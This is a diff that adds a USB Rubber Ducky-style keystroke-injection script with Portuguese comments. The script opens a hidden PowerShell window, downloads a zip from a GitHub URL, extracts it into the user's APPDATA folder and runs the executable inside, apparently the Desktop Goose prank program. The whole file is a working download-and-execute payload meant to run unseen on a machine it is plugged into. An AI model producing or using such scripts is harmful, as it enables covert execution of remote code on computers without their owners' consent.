@@ -1,0 +1,28 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+
+REM Define variáveis
+STRING $zip = "$env:APPDATA\goose.zip"
+ENTER
+STRING $dest = "$env:APPDATA\Goose"
+ENTER
+STRING $exe = "$dest\DesktopGoose v0.31\GooseDesktop.exe"
+ENTER
+
+REM Baixa o Goose
+STRING Invoke-WebRequest -Uri "https://github.com/Herna4ndes/Ganso/raw/main/DesktopGoose%20v0.31.zip" -OutFile $zip
+ENTER
+DELAY 5000
+
+REM Extrai o conteúdo
+STRING Expand-Archive -Path $zip -DestinationPath $dest -Force
+ENTER
+DELAY 3000
+
+REM Espera 10 segundos antes de executar
+STRING Start-Sleep -Seconds 10; Start-Process $exe
+ENTER
